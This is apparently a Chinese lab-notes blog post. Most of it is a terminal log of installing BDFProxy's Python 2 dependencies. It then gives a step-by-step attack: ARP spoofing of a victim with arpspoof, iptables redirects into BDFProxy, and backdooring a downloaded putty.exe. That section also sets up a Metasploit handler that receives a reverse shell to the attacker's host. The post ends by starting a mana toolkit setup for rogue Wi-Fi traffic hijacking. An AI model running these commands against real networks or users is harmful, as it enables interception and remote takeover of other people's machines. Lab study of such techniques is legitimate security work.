class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py              </span></span><br><span class="line">………………………………</span><br><span class="line">**ImportError: No module named netlib**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#下载：https://files.pythonhosted.org/packages/a8/18/d77c7e19df289628358beb498bd1d4c0ac9ca65eade441878fff7b07155f/netlib-0.16.tar.gz</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/netlib-0.16]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">…………………………</span><br><span class="line">creating build/lib.linux-x86_64-2.7/netlib</span><br><span class="line">copying netlib/utils.py -&gt; build/lib.linux-x86_64-2.7/netlib</span><br><span class="line">copying netlib/tutils.py -&gt; build/lib.linux-x86_64-2.7/netlib</span><br><span class="line">copying netlib/exceptions.py -&gt; build/lib.linux-x86_64-2.7/netlib</span><br><span class="line">………………………………</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py   </span></span><br><span class="line">……………………………………</span><br><span class="line">**ImportError: cannot import name ssl_match_hostname**</span><br><span class="line">  </span><br><span class="line"><span class="comment">#下载：https://distfiles.macports.org/py-backports-ssl_match_hostname/，注意版本</span></span><br><span class="line">**┌──(root㉿kali)** **-[~/ Desktop]</span><br><span class="line">└─<span class="comment"># wget https://distfiles.macports.org/py-backports-ssl_match_hostname/backports.ssl_match_hostname-3.5.0.1.tar.gz**</span></span><br><span class="line">--2023-02-08 01:06:04--  https://distfiles.macports.org/py-backports-ssl_match_hostname/backports.ssl_match_hostname-3.5.0.1.tar.gz</span><br><span class="line">Resolving distfiles.macports.org (distfiles.macports.org)... 151.101.2.132, 151.101.66.132, 151.101.130.132, ...</span><br><span class="line">Connecting to distfiles.macports.org (distfiles.macports.org)|151.101.2.132|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 5605 (5.5K) [application/x-gzip]</span><br><span class="line">Saving to: <span class="string">&#x27;backports.ssl_match_hostname-3.5.0.1.tar.gz&#x27;</span></span><br><span class="line"></span><br><span class="line">backports.ssl_match_hostname 100%[============================================&gt;]   5.47K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2023-02-08 01:06:07 (24.6 MB/s) - <span class="string">&#x27;backports.ssl_match_hostname-3.5.0.1.tar.gz&#x27;</span> saved [5605/5605]</span><br><span class="line"></span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># tar -zxvf backports.ssl_match_hostname-3.5.0.1.tar.gz </span></span><br><span class="line">backports.ssl_match_hostname-3.5.0.1/…………………………………………</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cd backports.ssl_match_hostname-3.5.0.1</span></span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">running install</span><br><span class="line">running build</span><br><span class="line">running build_py</span><br><span class="line">creating build</span><br><span class="line">creating build/lib.linux-x86_64-2.7</span><br><span class="line">creating build/lib.linux-x86_64-2.7/backports</span><br><span class="line">copying backports/__init__.py -&gt; build/lib.linux-x86_64-2.7/backports</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">……………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python2.7/dist-packages/cryptography/hazmat/primitives/constant_time.py&quot;</span>, line 11, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from cryptography.hazmat.bindings._constant_time import lib</span><br><span class="line">**ImportError: No module named _constant_time**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># **pip** **install** **cryptography**</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting cryptography</span><br><span class="line">  Downloading cryptography-3.3.2-cp27-cp27mu-manylinux2010_x86_64.whl (2.6 MB)</span><br><span class="line">     |████████████████████████████████| 2.6 MB 853 kB/s </span><br><span class="line">Requirement already satisfied: cffi&gt;=1.12 <span class="keyword">in</span> /usr/lib/python2.7/dist-packages (from cryptography) (1.14.0)</span><br><span class="line">Collecting ipaddress; python_version &lt; <span class="string">&quot;3&quot;</span></span><br><span class="line">  Downloading ipaddress-1.0.23-py2.py3-none-any.whl (18 kB)</span><br><span class="line">Collecting six&gt;=1.4.1</span><br><span class="line">  Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)</span><br><span class="line">Collecting enum34; python_version &lt; <span class="string">&quot;3&quot;</span></span><br><span class="line">  Downloading enum34-1.1.10-py2-none-any.whl (11 kB)</span><br><span class="line">Installing collected packages: ipaddress, six, enum34, cryptography</span><br><span class="line">Successfully installed cryptography-3.3.2 enum34-1.1.10 ipaddress-1.0.23 six-1.16.0</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">…………………………………………</span><br><span class="line">    from pyasn1.type import univ, constraint, char, namedtype, tag</span><br><span class="line">**ImportError: No module named pyasn1.type**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **pyasn1**    </span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting pyasn1</span><br><span class="line">  Downloading pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)</span><br><span class="line">     |████████████████████████████████| 77 kB 754 kB/s </span><br><span class="line">Installing collected packages: pyasn1</span><br><span class="line">Successfully installed pyasn1-0.4.8</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">………………………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/netlib/utils.py&quot;</span>, line 11, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import hyperframe</span><br><span class="line">**ImportError: No module named hyperframe**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **hyperframe**</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting hyperframe</span><br><span class="line">  Downloading hyperframe-5.2.0-py2.py3-none-any.whl (12 kB)</span><br><span class="line">Installing collected packages: hyperframe</span><br><span class="line">Successfully installed hyperframe-5.2.0</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">……………………………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/netlib/http/http2/connections.py&quot;</span>, line 5, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from hpack.hpack import Encoder, Decoder</span><br><span class="line">**ImportError: No module named hpack.hpack**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **hpack**    </span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting hpack</span><br><span class="line">  Downloading hpack-3.0.0-py2.py3-none-any.whl (38 kB)</span><br><span class="line">Installing collected packages: hpack</span><br><span class="line">Successfully installed hpack-3.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">………………………………………………</span><br><span class="line">    from construct import ConstructError</span><br><span class="line">**ImportError: No module named construct**</span><br><span class="line">  </span><br><span class="line"><span class="comment">#下载：https://pypi.org/project/construct/2.5.2/#files ， **注意版本**</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wget https://files.pythonhosted.org/packages/fd/5a/e3105c79b3b0bbf7a80dc8218d7416df6551f9f2fe389c9ce6690a621c00/construct-2.5.2.tar.gz</span></span><br><span class="line">--2023-02-08 01:53:18--  https://files.pythonhosted.org/packages/fd/5a/e3105c79b3b0bbf7a80dc8218d7416df6551f9f2fe389c9ce6690a621c00/construct-2.5.2.tar.gz</span><br><span class="line">Resolving files.pythonhosted.org (files.pythonhosted.org)... 151.101.1.63, 151.101.65.63, 151.101.129.63, ...</span><br><span class="line">Connecting to files.pythonhosted.org (files.pythonhosted.org)|151.101.1.63|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 58373 (57K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;construct-2.5.2.tar.gz&#x27;</span></span><br><span class="line"></span><br><span class="line">construct-2.5.2.tar.gz       100%[============================================&gt;]  57.00K  --.-KB/s    <span class="keyword">in</span> 0.09s   </span><br><span class="line"></span><br><span class="line">2023-02-08 01:53:21 (619 KB/s) - <span class="string">&#x27;construct-2.5.2.tar.gz&#x27;</span> saved [58373/58373]</span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># tar -zxvf construct-2.5.2.tar.gz </span></span><br><span class="line">construct-2.5.2/</span><br><span class="line">construct-2.5.2/construct.egg-info/…………………………………………</span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/construct-2.5.2]</span><br><span class="line">└─<span class="comment"># **python2 setup.py** **install**</span></span><br><span class="line">/usr/lib/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: <span class="string">&#x27;install_requires&#x27;</span></span><br><span class="line">  warnings.warn(msg)</span><br><span class="line">running install</span><br><span class="line">running build</span><br><span class="line">running build_py</span><br><span class="line">creating build</span><br><span class="line">creating build/lib.linux-x86_64-2.7</span><br><span class="line">creating build/lib.linux-x86_64-2.7/construct</span><br><span class="line">copying construct/core.py -&gt; build/lib.linux-x86_64-2.7/construct</span><br><span class="line">copying construct/macros.py -&gt; build/lib.linux-x86_64-2.7/construct</span><br><span class="line">………………………………</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/libmproxy/protocol/http.py&quot;</span>, line 11, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from h2.exceptions import H2Error</span><br><span class="line">**ImportError: No module named h2.exceptions**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/construct-2.5.2]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **h2**                               </span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting h2</span><br><span class="line">  Downloading h2-3.2.0-py2.py3-none-any.whl (65 kB)</span><br><span class="line">     |████████████████████████████████| 65 kB 626 kB/s </span><br><span class="line">Requirement already satisfied: hpack&lt;4,&gt;=3.0 <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages (from h2) (3.0.0)</span><br><span class="line">Requirement already satisfied: hyperframe&lt;6,&gt;=5.2.0 <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages (from h2) (5.2.0)</span><br><span class="line">Requirement already satisfied: enum34&lt;2,&gt;=1.1.6; python_version == <span class="string">&quot;2.7&quot;</span> <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages (from h2) (1.1.10)</span><br><span class="line">Installing collected packages: h2</span><br><span class="line">Successfully installed h2-3.2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">……………………………………</span><br><span class="line">  File <span class="string">&quot;/root/Desktop/BDFProxy/bdf/pebin.py&quot;</span>, line 41, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pefile</span><br><span class="line">**ImportError: No module named pefile**</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载：https://src.fedoraproject.org/repo/pkgs/python-pefile/ **注意版本**</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/pefile-2019.4.18]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">…………………………</span><br><span class="line">copying pefile.py -&gt; build/lib.linux-x86_64-2.7</span><br><span class="line">copying peutils.py -&gt; build/lib.linux-x86_64-2.7</span><br><span class="line">………………………………</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">……………………………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/pefile.py&quot;</span>, line 21, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from builtins import bytes</span><br><span class="line">**ImportError: No module named builtins**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wget https://files.pythonhosted.org/packages/8f/2e/cf6accf7415237d6faeeebdc7832023c90e0282aa16fd3263db0eb4715ec/future-0.18.3.tar.gz  </span></span><br><span class="line">--2023-02-08 02:02:43--  https://files.pythonhosted.org/packages/8f/2e/cf6accf7415237d6faeeebdc7832023c90e0282aa16fd3263db0eb4715ec/future-0.18.3.tar.gz</span><br><span class="line">Resolving files.pythonhosted.org (files.pythonhosted.org)... 151.101.77.63, 2a04:4e42::319, 2a04:4e42:200::319, ...</span><br><span class="line">Connecting to files.pythonhosted.org (files.pythonhosted.org)|151.101.77.63|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 840896 (821K) [application/x-tar]</span><br><span class="line">Saving to: <span class="string">&#x27;future-0.18.3.tar.gz&#x27;</span></span><br><span class="line"></span><br><span class="line">future-0.18.3.tar.gz         100%[============================================&gt;] 821.19K  1.60MB/s    <span class="keyword">in</span> 0.5s    </span><br><span class="line"></span><br><span class="line">2023-02-08 02:02:46 (1.60 MB/s) - <span class="string">&#x27;future-0.18.3.tar.gz&#x27;</span> saved [840896/840896]</span><br><span class="line"></span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># tar -zxvf future-0.18.3.tar.gz   </span></span><br><span class="line">future-0.18.3/</span><br><span class="line">future-0.18.3/setup.sh………………………………</span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/future-0.18.3]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">…………………………</span><br><span class="line">creating build/lib.linux-x86_64-2.7/future</span><br><span class="line">copying src/future/__init__.py -&gt; build/lib.linux-x86_64-2.7/future</span><br><span class="line">creating build/lib.linux-x86_64-2.7/future/builtins</span><br><span class="line">…………………………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">…………………………………………</span><br><span class="line">  File <span class="string">&quot;/root/Desktop/BDFProxy/bdf/intel/intelCore.py&quot;</span>, line 38, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from capstone import * **ImportError: No module named capstone**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/future-0.18.3]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **capstone**</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting capstone</span><br><span class="line">  Downloading capstone-4.0.2-py2.py3-none-manylinux1_x86_64.whl (2.1 MB)</span><br><span class="line">     |████████████████████████████████| 2.1 MB 1.4 MB/s </span><br><span class="line">Installing collected packages: capstone</span><br><span class="line">Successfully installed capstone-4.0.2</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;./bdf_proxy.py&quot;</span>, line 49, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from configobj import ConfigObj</span><br><span class="line">**ImportError: No module named configobj**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/future-0.18.3]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **configobj**</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting configobj</span><br><span class="line">  Downloading configobj-5.0.8-py2.py3-none-any.whl (36 kB)</span><br><span class="line">Requirement already satisfied: six <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages (from configobj) (1.16.0)</span><br><span class="line">Installing collected packages: configobj</span><br><span class="line">Successfully installed configobj-5.0.8 **┌──(root㉿kali) -[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># ./bdf_proxy.py --help</span></span><br><span class="line">**/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[!] Writing resource script.</span><br><span class="line">[!] Resource writen to bdfproxy_msf_resource.rc</span><br><span class="line">[!] Configuring traffic forwarding</span><br><span class="line">[*] Starting BDFProxy</span><br><span class="line">[*]          !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">         ALERT: NEW VERSION AVAILABLE</span><br><span class="line">         *** ONLY AVAILABLE TO SPONSORS ***</span><br><span class="line">         SPONSOR THE NEXT VERSION HERE: https://github.com/sponsors/secretsquirrel</span><br><span class="line">         Author:    Joshua Pitts</span><br><span class="line">         Email:     the.midnite.runr[-at ]gmail&lt;d o-t&gt;com</span><br><span class="line">         Twitter:   @ausernamedjosh</span><br><span class="line">         SPONSOR THE NEXT VERSION HERE: https://github.com/sponsors/secretsquirrel</span><br><span class="line">         !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">[*] Version: v0.3.8</span><br><span class="line">[*] Author: @midnite_runr | the[.]midnite).(runr&lt;at&gt;gmail|.|com</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230208163027589-1352751873.png" /></p>
<p>总之，缺哪个安装哪个，不过有时候用 pip
直接安装可能会失败，需要单独下载安装包手动安装，另须注意版本，版本不对可能会引进新的问题，以
construct
为例，安装2.10.54和2.8.8都会报如下错误，换成2.5.2即可正常。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">………………</span><br><span class="line">File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/libmproxy/contrib/tls/_constructs.py&quot;</span>, line 7, <span class="keyword">in</span> &lt;module&gt; from construct import (Array, Bytes, Struct, UBInt16, UBInt32, UBInt8, PascalString, Embed, TunnelAdapter, GreedyRange,</span><br><span class="line">ImportError: cannot import name UBInt16</span><br></pre></td></tr></table></figure>
<p>更换 construct
版本是发现个问题，直接用"uninstall"卸载会报错，，，如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/construct-2.8.8]</span><br><span class="line">└─<span class="comment"># pip2 uninstall construct        </span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.  </span></span><br><span class="line">Found existing installation: construct 2.10.54 **ERROR: Cannot uninstall <span class="string">&#x27;construct&#x27;</span>. It is a distutils installed project and thus we cannot accurately determine <span class="built_in">which</span> files belong to it <span class="built_in">which</span> would lead to only a partial uninstall.** </span><br></pre></td></tr></table></figure>
<p>解决方法是直接将 "/usr/local/lib/python2.7/dist-packages/construct"
文件清空，并删掉 "/usr/local/lib/python2.7/dist-packages" 下的
construct-2.10.54.egg- info，再重新安装construct-2.5.2即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/…/lib/python2.7/dist-packages/construct]</span><br><span class="line">└─<span class="comment"># rm -rf *</span></span><br><span class="line">zsh: sure you want to delete all 12 files <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages/construct [yn]? y</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/usr/…/lib/python2.7/dist-packages/construct]</span><br><span class="line">└─<span class="comment"># cd ..  </span></span><br><span class="line">┌──(root㉿kali)-[/usr/local/lib/python2.7/dist-packages]</span><br><span class="line">└─<span class="comment"># rm construct-2.10.54.egg-info </span></span><br><span class="line">…………</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/construct-2.5.2]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">/usr/lib/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: <span class="string">&#x27;install_requires&#x27;</span></span><br><span class="line">  warnings.warn(msg)</span><br><span class="line">running install</span><br><span class="line">running build</span><br><span class="line">running build_py</span><br><span class="line">creating build</span><br><span class="line">creating build/lib.linux-x86_64-2.7</span><br><span class="line">creating build/lib.linux-x86_64-2.7/construct</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
<h3 id="基于arp欺骗">2、基于ARP欺骗</h3>
<ul>
<li><strong>步骤【Kali2.0上演示】</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改 IP 转发</span></span><br><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"><span class="comment">#修改 iptables</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</span><br><span class="line"><span class="comment">#修改配置文件</span></span><br><span class="line">vi /etc/bdfproxy/bdfproxy.cfg</span><br><span class="line">proxyMode = transparent <span class="comment">#改为透明代理</span></span><br><span class="line">HOST = 192.168.159.129  <span class="comment">#修改反弹 shell 的地址（攻击者kali地址），注各种shell的地址</span></span><br><span class="line"><span class="comment">#启动 bdfproxy</span></span><br><span class="line">bdfproxy</span><br><span class="line"><span class="comment">#启动 msfconsole</span></span><br><span class="line">msfdb init <span class="comment">#初始化</span></span><br><span class="line">msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">jobs</span></span><br><span class="line"><span class="comment"># arp 欺骗</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.159.133 192.168.159.2 <span class="comment">#前面的IP是靶机，后面是网关</span></span><br><span class="line"><span class="comment">#靶机浏览器浏览和下载putty.exe，</span></span><br><span class="line"><span class="comment">#靶机尝试下载执行软件并打开putty</span></span><br><span class="line"><span class="comment">#kali里有了反弹shell</span></span><br><span class="line">msf exploit(multi/handler) &gt; sessions -i 1 <span class="comment">#进入shell</span></span><br></pre></td></tr></table></figure>
<p><strong>注</strong>
，靶机的相应操作都能在kali的bdfproxy页面（或日志）里看到，putty下载页面：<a
href="https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.63.html"
class="uri">https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.63.html</a></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207182505372-1908398020.gif" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207182157800-1386535916.png" /></p>
<h3 id="无线流量劫持">3、无线流量劫持</h3>
<h4 id="mana-安装">（1）mana 安装</h4>
<ul>
<li><strong>方法一【推荐】：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get --<span class="built_in">yes</span> install build-essential pkg-config git libnl-genl-3-dev libssl-dev</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/sensepost/hostapd-mana</span><br><span class="line"><span class="built_in">cd</span> hostapd-mana</span><br><span class="line">make -C hostapd</span><br><span class="line"><span class="built_in">mv</span> /tmp/hostapd-mana/hostapd/ /usr/lib/mana-toolkit</span><br><span class="line"><span class="built_in">cd</span> /usr/share/</span><br><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/sensepost/mana.git</span><br><span class="line"><span class="built_in">mv</span> mana mana-toolkit</span><br><span class="line"><span class="built_in">mkdir</span> /etc/mana-toolkit/</span><br><span class="line"><span class="built_in">mv</span> mana-toolkit/run-mana/conf/*.conf /etc/mana-toolkit/</span><br></pre></td></tr></table></figure>
<p>注，编译时可能会有警告，忽略即可</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230208165827852-1949583441.png" /></p>
<ul>
<li><strong>方法二：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/sensepost/mana</span><br><span class="line"><span class="built_in">cd</span> mana</span><br><span class="line">git submodule init</span><br><span class="line">git submodule update</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<h4 id="演示-1">（2）演示</h4>
<ul>
<li><strong>修改WiFi基本信息，如 SSID 名称，信道，网卡等</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/mana-toolkit/hostapd-mana.conf </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230208203841215-922005420.png" /></p>
